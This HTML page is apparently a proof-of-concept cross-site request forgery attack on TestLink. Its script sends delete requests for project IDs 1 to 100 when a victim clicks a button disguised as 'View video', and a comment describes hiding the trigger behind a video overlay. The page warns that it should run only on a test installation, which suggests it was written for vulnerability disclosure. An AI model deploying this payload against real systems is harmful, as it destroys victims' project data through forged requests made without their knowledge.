<html>
<head>
<script type='text/javascript'>

var hackIt = function() {
	console.log('Initializing the attack...');

	var host = 'http://localhost/testlink/';
	var urlRoot = host + 'lib/project/projectEdit.php?doAction=doDelete&tprojectID=';
	
	for(var i = 1; i <= 100 ; i++) {
		console.log('Getting URL: ' + urlRoot + i);
		try {
			$.ajax({
			  url: urlRoot + i
			});
		} catch (e) {
			// Do nothing
		}
	}

	console.log('Done!');
	
};
</script>
</head>
<body>
<h1>Attention! This will delete projects with IDs varying from 1 to 100!!! Use a test TestLink installation!!!</h1>
<button onclick='hackIt();'>View video</button>
<hr/> 
<p><em>Note: Here the attacker could put a video, with a div over it. When the user clicked on the Play button, the div onclick event would be triggered (like the one in the button) and it would then try to delete the projects.</em></p>
<script type='text/javascript' src='jquery.js'></script>
</body>
</html>